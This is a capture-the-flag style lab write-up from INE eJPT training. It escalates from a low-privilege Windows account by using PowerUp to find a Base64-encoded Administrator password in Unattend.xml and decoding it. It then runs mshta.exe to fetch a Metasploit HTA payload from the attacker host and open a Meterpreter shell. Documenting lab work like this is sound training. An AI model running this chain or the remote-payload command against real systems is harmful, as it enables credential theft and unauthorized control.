# Windows Privilege Escalation via Unattended Installation (PowerUp) - INE eJPT

INE privilege escalation lab on a Windows target with initial access as a low-privilege `student` account. PowerUp identifies `Unattend.xml` containing a Base64-encoded Administrator password. Credentials are decoded, `runas` provides local admin access, and an HTA payload delivers a high-privilege Meterpreter session.

Target: Windows with PowerSploit pre-installed

---

## Enumeration

```powershell
whoami
```

Current user: `student` - limited privileges.

### Loading PowerUp

```powershell
cd .\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

PowerUp reports a finding:

```
C:\Windows\Panther\Unattend.xml
```

---

## Vulnerability Discovery - Unattend.xml

```powershell
cat C:\Windows\Panther\Unattend.xml
```

Administrator password stored as Base64:

```
QWRtaW5AMTIz
```

### Decode

```powershell
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($password)
)
echo $password
```

```
Admin@123
```

---

## Local Escalation

```cmd
runas.exe /user:administrator cmd
```

Enter password `Admin@123` when prompted.

```cmd
whoami
```

Output: `administrator`

---

## Persistent Remote Access via HTA

From the Kali attacker machine:

```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

The module generates an HTA URL, for example:

```
http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

From the Administrator `cmd.exe` on the target:

```cmd
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

Meterpreter session with elevated privileges obtained.

```bash
sessions -i 1
cd C:\Users\Administrator\Desktop
dir
cat flag.txt
```

---

## Key Takeaways

- `Unattend.xml` is a Windows automated installation artifact frequently left on disk after OS deployment. Its content is within scope for every Windows post-exploitation session.
- Base64 in `Unattend.xml` is encoding, not encryption. Any base64 decoder recovers the plaintext password immediately - never assume encoded credentials are protected.
- `Invoke-PrivescAudit` from PowerUp covers common Windows misconfiguration checks including unattended install files, AlwaysInstallElevated, service binary permissions, and DLL hijacking candidates.
- HTA payloads via `hta_server` provide a quick path from `runas` credentials to a Meterpreter session without writing a file to disk in the traditional sense.
- The pattern `low-priv shell -> PowerUp audit -> credential in config file -> runas -> elevated shell` is one of the most common Windows PrivEsc sequences in real engagements and eJPT exam scenarios.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
